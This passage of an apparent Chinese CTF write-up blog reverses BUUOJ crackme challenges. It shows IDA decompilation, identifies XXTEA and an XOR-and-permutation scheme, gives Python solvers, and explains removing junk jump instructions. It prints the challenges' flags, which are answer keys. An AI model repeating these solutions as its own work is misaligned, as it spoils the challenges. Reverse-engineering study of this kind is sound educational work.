class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> _603170:</span><br><span class="line">  key += <span class="built_in">chr</span>(_)</span><br><span class="line">aes = AES.new(key.encode(<span class="string">&quot;ISO-8859-1&quot;</span>), AES.MODE_ECB)</span><br><span class="line">print(aes.decrypt(cipher.encode(<span class="string">&quot;ISO-8859-1&quot;</span>)).decode())</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{924a9ab2163d390410d0a1f670}</strong></p></blockquote><hr /><h1 id="2019红帽杯xx"><a class="markdownIt-Anchor" href="#2019红帽杯xx"></a> [2019红帽杯]xx</h1><p>链接: <a href="https://buuoj.cn/challenges#%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx">https://buuoj.cn/challenges#[2019红帽杯]xx</a></p><p>EXE 64</p><p>IDA中 <strong>main</strong> 函数反编译结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int128 *v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// r11</span></span><br><span class="line">  __int128 *v7; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edi</span></span><br><span class="line">  __int128 *v9; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// edx</span></span><br><span class="line">  __int64 v12; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v18; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE *v19; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v20; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">char</span> *v22; <span class="comment">// r8</span></span><br><span class="line">  __int64 v23; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// al</span></span><br><span class="line">  __int64 v25; <span class="comment">// r9</span></span><br><span class="line">  __int64 v26; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v27; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  __int128 v30; <span class="comment">// [rsp+28h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+3Ch] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> Code[<span class="number">4</span>]; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [rsp+50h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  *(_OWORD *)Code = <span class="number">0</span>i64;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  sub_1400018C0(<span class="built_in">std</span>::<span class="built_in">cin</span>, argv, Code);</span><br><span class="line">  v3 = <span class="number">-1</span>i64;</span><br><span class="line">  v4 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v4;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)Code + v4) );</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_140001620(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">    _exit((<span class="keyword">int</span>)Code);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = (__int128 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">5u</span>i64);</span><br><span class="line">  v6 = *(_QWORD *)&amp;::Code;</span><br><span class="line">  v7 = v5;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = v5;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = *((_BYTE *)v9 + (<span class="keyword">char</span> *)Code - (<span class="keyword">char</span> *)v5);</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)v9 = v10;</span><br><span class="line">    v12 = <span class="number">0</span>i64;</span><br><span class="line">    v13 = <span class="number">-1</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++v13;</span><br><span class="line">    <span class="keyword">while</span> ( *(_BYTE *)(v6 + v13) );</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v10 == *(_BYTE *)(v6 + v12) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v11;</span><br><span class="line">        ++v12;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v11 &lt; v13 );</span><br><span class="line">    &#125;</span><br><span class="line">    v14 = <span class="number">-1</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++v14;</span><br><span class="line">    <span class="keyword">while</span> ( *(_BYTE *)(v6 + v14) );</span><br><span class="line">    <span class="keyword">if</span> ( v11 == v14 )</span><br><span class="line">      _exit(v6);</span><br><span class="line">    v9 = (__int128 *)((<span class="keyword">char</span> *)v9 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">char</span> *)v9 - (<span class="keyword">char</span> *)v5 &lt; <span class="number">4</span> );</span><br><span class="line">  *((_BYTE *)v5 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v3;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)Code + v3) );</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  v30 = *v7;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;v30 + v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)&amp;v30 + v15 + <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v15;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)&amp;v30 + v15 + <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 += <span class="number">2</span>i64;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)&amp;v30 + v15 + <span class="number">3</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 += <span class="number">3</span>i64;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v15 += <span class="number">4</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v15 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = v15 + <span class="number">1</span>; i &lt; <span class="number">0x10</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;v30 + i) = <span class="number">0</span>;</span><br><span class="line">  v17 = (__int64)sub_140001AB0((__int64)Code, v3, (<span class="keyword">unsigned</span> __int8 *)&amp;v30, &amp;Size);</span><br><span class="line">  v18 = Size;</span><br><span class="line">  v19 = (_BYTE *)v17;</span><br><span class="line">  v20 = <span class="keyword">operator</span> <span class="keyword">new</span>(Size);</span><br><span class="line">  v21 = <span class="number">1</span>;</span><br><span class="line">  *v20 = v19[<span class="number">2</span>];</span><br><span class="line">  v22 = v20 + <span class="number">1</span>;</span><br><span class="line">  v20[<span class="number">1</span>] = *v19;</span><br><span class="line">  v20[<span class="number">2</span>] = v19[<span class="number">3</span>];</span><br><span class="line">  v20[<span class="number">3</span>] = v19[<span class="number">1</span>];</span><br><span class="line">  v20[<span class="number">4</span>] = v19[<span class="number">6</span>];</span><br><span class="line">  v20[<span class="number">5</span>] = v19[<span class="number">4</span>];</span><br><span class="line">  v20[<span class="number">6</span>] = v19[<span class="number">7</span>];</span><br><span class="line">  v20[<span class="number">7</span>] = v19[<span class="number">5</span>];</span><br><span class="line">  v20[<span class="number">8</span>] = v19[<span class="number">10</span>];</span><br><span class="line">  v20[<span class="number">9</span>] = v19[<span class="number">8</span>];</span><br><span class="line">  v20[<span class="number">10</span>] = v19[<span class="number">11</span>];</span><br><span class="line">  v20[<span class="number">11</span>] = v19[<span class="number">9</span>];</span><br><span class="line">  v20[<span class="number">12</span>] = v19[<span class="number">14</span>];</span><br><span class="line">  v20[<span class="number">13</span>] = v19[<span class="number">12</span>];</span><br><span class="line">  v20[<span class="number">14</span>] = v19[<span class="number">15</span>];</span><br><span class="line">  v20[<span class="number">15</span>] = v19[<span class="number">13</span>];</span><br><span class="line">  v20[<span class="number">16</span>] = v19[<span class="number">18</span>];</span><br><span class="line">  v20[<span class="number">17</span>] = v19[<span class="number">16</span>];</span><br><span class="line">  v20[<span class="number">18</span>] = v19[<span class="number">19</span>];</span><br><span class="line">  v20[<span class="number">19</span>] = v19[<span class="number">17</span>];</span><br><span class="line">  v20[<span class="number">20</span>] = v19[<span class="number">22</span>];</span><br><span class="line">  v20[<span class="number">21</span>] = v19[<span class="number">20</span>];</span><br><span class="line">  v20[<span class="number">22</span>] = v19[<span class="number">23</span>];</span><br><span class="line">  <span class="keyword">for</span> ( v20[<span class="number">23</span>] = v19[<span class="number">21</span>]; v21 &lt; v18; ++v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v21 / <span class="number">3</span> &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = *v22;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v24 ^= v20[v23++];</span><br><span class="line">        *v22 = v24;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v23 &lt; v21 / <span class="number">3</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    ++v21;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;v30 = <span class="number">0xC0953A7C6B40BCCE</span>ui64;</span><br><span class="line">  v25 = v20 - (_BYTE *)&amp;v30;</span><br><span class="line">  *((_QWORD *)&amp;v30 + <span class="number">1</span>) = <span class="number">0x3502F79120209BEF</span>i64;</span><br><span class="line">  v26 = <span class="number">0</span>i64;</span><br><span class="line">  v31 = <span class="number">0xC8021823</span>;</span><br><span class="line">  v32 = <span class="number">0xFA5656E7</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v30 + v26) != *((_BYTE *)&amp;v30 + v26 + v25) )</span><br><span class="line">      _exit(v8 * v8);</span><br><span class="line">    ++v8;</span><br><span class="line">    ++v26;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v26 &lt; <span class="number">24</span> );</span><br><span class="line">  v27 = sub_140001620(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v27, sub_1400017F0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA中使用插件<code>FindCrypt</code>可以看到程序使用了TEA加密<br />结合题目可以猜出是XXTEA加密<br /><s>这题基本是看着别人的WP做出来的</s></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000140001C4B  global  TEA_DELTA_140001C4B $c0 b&#39;\xb9y7\x9e&#39;</span><br></pre></td></tr></table></figure><p>从上往下分析</p><ul><li>用户输入字符串, 长度为19</li><li>前四个字符在字符集&quot;qwertyuiopasdfghjklzxcvbnm1234567890&quot;中</li><li>取前四字节为密钥</li><li>加密结果乱序</li><li>迭代异或</li><li>校验加密结果</li></ul><p>迭代异或的方式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher[3] &#x3D; cipher[3] ^ cipher[0]</span><br><span class="line">cipher[4] &#x3D; cipher[4] ^ cipher[0]</span><br><span class="line">cipher[5] &#x3D; cipher[5] ^ cipher[0]</span><br><span class="line">cipher[6] &#x3D; cipher[6] ^ cipher[0] ^ cipher[1]</span><br><span class="line">cipher[7] &#x3D; cipher[7] ^ cipher[0] ^ cipher[1]</span><br><span class="line">cipher[8] &#x3D; cipher[8] ^ cipher[0] ^ cipher[1]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>密文如下(大端赋值, 之后需要转为小端的字符串)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)&amp;v30 &#x3D; 0xC0953A7C6B40BCCEui64;</span><br><span class="line">*((_QWORD *)&amp;v30 + 1) &#x3D; 0x3502F79120209BEFi64;</span><br><span class="line">v31 &#x3D; 0xC8021823;</span><br><span class="line">v32 &#x3D; 0xFA5656E7;</span><br></pre></td></tr></table></figure><p>且这三个变量的内存分布如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__int128 v30; &#x2F;&#x2F; [rsp+28h] [rbp-40h] BYREF</span><br><span class="line">int v31; &#x2F;&#x2F; [rsp+38h] [rbp-30h]</span><br><span class="line">int v32; &#x2F;&#x2F; [rsp+3Ch] [rbp-2Ch]</span><br></pre></td></tr></table></figure><p>所以四个数据的整体才是密文部分</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> xxtea</span><br><span class="line">cipher = [</span><br><span class="line"><span class="number">0xC0953A7C6B40BCCE</span>, </span><br><span class="line"><span class="number">0x3502F79120209BEF</span>, </span><br><span class="line"><span class="number">0xC8021823</span>, </span><br><span class="line"><span class="number">0xFA5656E7</span>]</span><br><span class="line"><span class="comment"># 转小端字节串</span></span><br><span class="line">_byte = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher:</span><br><span class="line">  _byte += binascii.unhexlify(<span class="built_in">hex</span>(_)[<span class="number">2</span>:].encode(<span class="string">&quot;ISO-8859-1&quot;</span>))[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 迭代异或</span></span><br><span class="line">__byte = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> _byte]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(__byte)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">  <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(_//<span class="number">3</span>):</span><br><span class="line">    __byte[_] = __byte[_] ^ __byte[__]</span><br><span class="line"><span class="comment"># 异或结果转为字节串</span></span><br><span class="line">___byte = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> __byte:</span><br><span class="line">  ___byte += <span class="built_in">chr</span>(_)</span><br><span class="line">___byte = ___byte.encode(<span class="string">&quot;ISO-8859-1&quot;</span>)</span><br><span class="line"><span class="comment"># 还原顺序</span></span><br><span class="line">seq_enc = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">21</span>]</span><br><span class="line">seq_dec = [-<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> seq_enc]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seq_enc)):</span><br><span class="line">  seq_dec[_] = seq_enc.index(_)</span><br><span class="line">____byte = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(___byte)):</span><br><span class="line">  ____byte += <span class="built_in">chr</span>(___byte[seq_dec[_]]).encode(<span class="string">&quot;ISO-8859-1&quot;</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">key = <span class="string">&quot;flag&quot;</span></span><br><span class="line">flag = xxtea.decrypt(____byte, key).decode()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p><strong>flag{CXX_and_++tea}</strong></p></blockquote><hr /><h1 id="findkey"><a class="markdownIt-Anchor" href="#findkey"></a> findKey</h1><p>链接: <a href="https://buuoj.cn/challenges#findKey">https://buuoj.cn/challenges#findKey</a></p><p>EXE 32</p><p>一开始没找到主函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00423028 aFlag           db &#39;flag&#123;&#125;&#39;,0           ; DATA XREF: .text:00401A3A↑o</span><br></pre></td></tr></table></figure><p>找到这样的一个字符串<br />搜索文本之后找到位置<code>loc_401A37</code><br />但是这里并没有被定义成函数<br />粗略看下有一段疑似插入了花指令的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0040191D loc_40191D:                             ; CODE XREF: .text:0040193D↓j</span><br><span class="line">.text:0040191D                 push    offset byte_428C54</span><br><span class="line">.text:00401922                 call    _strlen</span><br><span class="line">.text:00401927                 add     esp, 4</span><br><span class="line">.text:0040192A                 push    eax</span><br><span class="line">.text:0040192B                 push    offset byte_428C54</span><br><span class="line">.text:00401930                 call    sub_40101E</span><br><span class="line">.text:00401935                 add     esp, 0Ch</span><br><span class="line">.text:00401938                 nop</span><br><span class="line">.text:00401939                 jz      short loc_401948</span><br><span class="line">.text:0040193B                 jnz     short loc_401948</span><br><span class="line">.text:0040193D                 jmp     short near ptr loc_40191D+2</span><br></pre></td></tr></table></figure><p><s>根据我做的那些逆向题目的经验</s><br />按理说jz的前一条指令是能够对ZF产生影响的, 例如cmp, test<br />更奇怪的是后面跟了一条jnz和一条jmp</p><p>把这三条nop掉就可以定义为函数了<br />反编译后了下伪代码, 感觉差不多就是<strong>main</strong>函数了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// eax</span></span><br><span class="line">  DWORD v6; <span class="comment">// eax</span></span><br><span class="line">  HWND v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v10; <span class="comment">// [esp+0h] [ebp-44Ch]</span></span><br><span class="line">  <span class="keyword">const</span> CHAR *v11; <span class="comment">// [esp+4h] [ebp-448h]</span></span><br><span class="line">  UINT v12; <span class="comment">// [esp+8h] [ebp-444h]</span></span><br><span class="line">  CHAR v13[<span class="number">256</span>]; <span class="comment">// [esp+54h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14[<span class="number">7</span>]; <span class="comment">// [esp+154h] [ebp-2F8h] BYREF</span></span><br><span class="line">  __int16 v15; <span class="comment">// [esp+15Bh] [ebp-2F1h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [esp+15Dh] [ebp-2EFh]</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">33</span>]; <span class="comment">// [esp+160h] [ebp-2ECh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">220</span>]; <span class="comment">// [esp+181h] [ebp-2CBh] BYREF</span></span><br><span class="line">  __int16 v19; <span class="comment">// [esp+25Dh] [ebp-1EFh]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+25Fh] [ebp-1EDh]</span></span><br><span class="line">  CHAR v21[<span class="number">256</span>]; <span class="comment">// [esp+260h] [ebp-1ECh] BYREF</span></span><br><span class="line">  CHAR String[<span class="number">4</span>]; <span class="comment">// [esp+360h] [ebp-ECh] BYREF</span></span><br><span 